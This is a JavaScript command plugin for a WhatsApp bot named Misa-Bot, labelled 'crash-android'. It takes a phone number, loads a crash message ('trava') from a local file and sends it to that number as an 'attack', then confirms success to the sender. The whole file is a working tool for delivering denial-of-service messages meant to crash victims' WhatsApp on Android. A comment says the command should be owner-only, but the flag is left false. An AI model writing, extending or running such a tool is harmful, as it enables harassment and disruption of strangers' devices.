/* * 👑 MISA CRASH-ANDROID
 * Canal: https://whatsapp.com/channel/0029Vav6SNC7z4kofN80pW27
 * Github: https://github.com/yannielmedrano1-sys/Misa-Bot
 */

import fs from 'fs';
import path from 'path';

const crashAndroidMisa = {
    name: 'crash-android',
    alias: ['ca', 'crash', 'ola'],
    category: 'tools',
    noPrefix: true,
    isOwner: false, // Lo ponemos en true para que solo tú (Yanniel) puedas usarlo

    run: async (conn, m, { args, command }) => {
        try {
            // 1. Validación de número (Usando remoteJid como en tu menú)
            const chat = m.key.remoteJid;

            if (!args[0]) {
                const textoUso = `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]\n> ✐ *Ejemplo:* ${command} 1809xxxxxxx`;
                return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
            }

            // 2. Limpieza de JID
            const num = args[0].replace(/[^0-9]/g, '');
            if (!num || num.length < 8) {
                return await conn.sendMessage(chat, { text: '❌ *Número inválido.*' }, { quoted: m });
            }
            const targetJid = `${num}@s.whatsapp.net`;

            // 3. Leer la trava desde tu carpeta /travas/
            const pathTrava = path.join(process.cwd(), 'travas', 'ola.js');
            
            if (!fs.existsSync(pathTrava)) {
                return await conn.sendMessage(chat, { text: '❌ No encontré el archivo: `travas/ola.js`' }, { quoted: m });
            }

            const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');

            // 4. Ejecución (Reacción y envío)
            await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });

            // Enviamos el "misil" al objetivo
            await conn.sendMessage(targetJid, { text: contenidoTrava });

            // 5. Confirmación final con estética Misa
            await conn.sendMessage(chat, { 
                text: `✅ *Ataque enviado con éxito a @${num}*`,
                mentions: [targetJid]
            }, { quoted: m });

        } catch (err) {
            console.error('Error en crash-android:', err);
        }
    }
};

export default crashAndroidMisa;
